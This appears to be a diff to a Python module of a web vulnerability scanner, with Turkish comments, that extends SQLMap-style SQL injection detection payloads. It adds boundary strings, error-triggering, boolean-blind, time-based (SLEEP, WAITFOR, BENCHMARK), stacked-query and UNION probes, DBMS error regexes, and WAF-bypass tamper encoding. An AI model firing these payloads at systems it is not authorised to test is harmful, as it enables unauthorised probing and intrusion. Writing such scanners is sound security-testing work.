@@ -1,6 +1,6 @@
 """SQLMap-inspired detection payloads — sömürü/destructive payload yok, sadece tespit."""
 
-# SQLMap errors.xml + DBMS hata imzaları
+# SQLMap errors.xml + DBMS hata imzaları (Genişletilmiş)
 DBMS_ERROR_PATTERNS = [
     r"SQL syntax.*MySQL",
     r"Warning.*\Wmysqli?_",
@@ -28,7 +28,7 @@ DBMS_ERROR_PATTERNS = [
     r"macromedia\.jdbc\.sqlserver",
     r"Zend_Db_(Adapter|Statement)_Mysqli_Exception",
     r"com\.microsoft\.sqlserver\.jdbc",
-    r"Pdo\.(?:Mysql|Sqlite|Pg)",
+    r"Pdo\.(?:Mysql|Sqlite|Pg|Oci)",
     r"SQLite/JDBCDriver",
     r"SQLite\.Exception",
     r"(Microsoft|System)\.Data\.SQLite\.SQLiteException",
@@ -86,17 +86,25 @@ DBMS_ERROR_PATTERNS = [
     r"PDOException",
     r"Doctrine\\DBAL",
     r"Illuminate\\Database\\QueryException",
+    r"Warning: mysql_num_rows",
+    r"Warning: mysql_fetch_assoc",
+    r"Warning: mysql_fetch_array",
+    r"Warning: pg_query",
+    r"Warning: pg_fetch",
+    r"Warning: oci_fetch",
+    r"Warning: sqlsrv_fetch",
 ]
 
-# SQLMap boundary / generic test payloads (detection)
+# SQLMap boundary / generic test payloads (detection, genişletilmiş)
 BOUNDARY_PAYLOADS = [
     "'", '"', "''", '""', "'--", '"--', "'#", '"#', "'/*", '"/*',
     "')", '")', "'))", '"))', "' OR '1", '" OR "1',
     "\\", "\\\\", "%27", "%22", "%bf%27", "%bf%22",
     "1'", '1"', "1'--", '1"--', "1'#", '1"#',
+    "'\\", '"\\', "'-- -", '"-- -',
 ]
 
-# Error-triggering probes (SQLMap generic)
+# Error-triggering probes (SQLMap generic, genişletilmiş)
 ERROR_PROBE_PAYLOADS = [
     "'", '"', "')", '")', "' OR '1'='1", '" OR "1"="1',
     "' OR 1=1--", '" OR 1=1--', "' OR 1=1#", '" OR 1=1#',
@@ -111,9 +119,15 @@ ERROR_PROBE_PAYLOADS = [
     "' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--",
     "' AND (SELECT * FROM (SELECT(SLEEP(0)))a)--",
     "1 AND 1=1", "1 AND 1=2", "1' AND '1'='1", "1' AND '1'='2",
+    "' AND 1=CAST(1 AS INT)--", '" AND 1=CAST(1 AS INT)--',
+    "' AND 1=CONVERT(INT,1)--", '" AND 1=CONVERT(INT,1)--',
+    "' AND ROWNUM=1--",  # Oracle
+    '" AND ROWNUM=1--',
+    "' AND 1=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES)--",
+    '" AND 1=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES)--',
 ]
 
-# Boolean blind pairs (SQLMap technique — true vs false yanıt farkı)
+# Boolean blind pairs (SQLMap technique — true vs false yanıt farkı, genişletilmiş)
 BOOLEAN_PAIRS = [
     ("' AND '1'='1", "' AND '1'='2"),
     ('" AND "1"="1', '" AND "1"="2'),
@@ -126,9 +140,12 @@ BOOLEAN_PAIRS = [
     ('") AND ("1"="1', '") AND ("1"="2'),
     ("' OR 'x'='x", "' OR 'x'='y"),
     ('" OR "x"="x', '" OR "x"="y'),
+    ("' AND 1=1/*", "' AND 1=2/*"),
+    ('" AND 1=1/*', '" AND 1=2/*'),
+    ("1' AND ASCII(SUBSTRING(version(),1,1))>0--", "1' AND ASCII(SUBSTRING(version(),1,1))<0--"),
 ]
 
-# Time-based hints (SQLMap — sadece gecikme sinyali, sömürü yok)
+# Time-based hints (SQLMap — sadece gecikme sinyali, sömürü yok, genişletilmiş)
 TIME_PAYLOADS = [
     ("'; WAITFOR DELAY '0:0:5'--", 'mssql'),
     ('"; WAITFOR DELAY "0:0:5"--', 'mssql'),
@@ -138,25 +155,32 @@ TIME_PAYLOADS = [
     ('1" AND pg_sleep(5)--', 'postgresql'),
     ("1' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--", 'oracle'),
     ("1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", 'mysql'),
+    ("1' AND BENCHMARK(1000000,MD5(1))--", 'mysql'),
+    ('1" AND BENCHMARK(1000000,MD5(1))--', 'mysql'),
+    ("1' AND (SELECT COUNT(*) FROM all_objects a, all_objects b, all_objects c)--", 'oracle'),
 ]
 
-# SQLMap tamper-inspired encoding variants (WAF bypass tespiti)
+# SQLMap tamper-inspired encoding variants (WAF bypass tespiti, genişletilmiş)
 def tamper_variants(payload):
     variants = [payload]
-    variants.append(payload.replace(' ', '/**/'))
-    variants.append(payload.replace(' ', '%20'))
-    variants.append(payload.replace(' ', '%09'))
-    variants.append(payload.replace(' ', '+'))
-    variants.append(payload.replace("'", "%27").replace('"', '%22'))
-    variants.append(payload.replace('OR', 'Or').replace('or', 'Or'))
-    variants.append(payload.replace('AND', 'AnD'))
-    return list(dict.fromkeys(variants))
+    from .waf import SQLI_TAMPERS
+    seen = {payload}
+    for tamper in SQLI_TAMPERS:
+        try:
+            v = tamper(payload)
+            if v not in seen:
+                seen.add(v)
+                variants.append(v)
+        except:
+            continue
+    return list(variants)
 
 # Stacked query detection probes (sadece hata/yanıt farkı)
 STACKED_PROBE_PAYLOADS = [
     "'; SELECT 1--", '"; SELECT 1--',
     "'; SELECT 1#", '"; SELECT 1#',
     "1;SELECT 1", "1';SELECT 1--",
+    "'; DECLARE @x INT; SET @x=1--", '"; DECLARE @x INT; SET @x=1--',
 ]
 
 # UNION column count probes (SQLMap ORDER BY / UNION NULL)
@@ -168,6 +192,7 @@ UNION_PROBE_PAYLOADS = [
     "' UNION SELECT NULL,NULL,NULL--", "' UNION SELECT NULL,NULL,NULL,NULL--",
     "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
     "' UNION ALL SELECT NULL--", "' UNION ALL SELECT NULL,NULL--",
+    "' UNION SELECT 1,2,3--", "' UNION SELECT 'a','b','c'--",
 ]
 
 def all_error_payloads():
